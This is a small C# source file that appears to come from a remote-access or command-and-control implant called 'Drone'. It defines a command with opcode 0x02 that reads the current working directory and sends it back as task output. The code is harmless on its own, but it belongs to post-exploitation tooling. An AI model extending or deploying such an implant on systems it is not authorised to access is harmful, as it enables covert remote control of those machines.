using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class PrintDirectory : DroneCommand
{
    public override byte Command => 0x02;

    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        await Drone.SendOutput(task, Directory.GetCurrentDirectory());
    }
}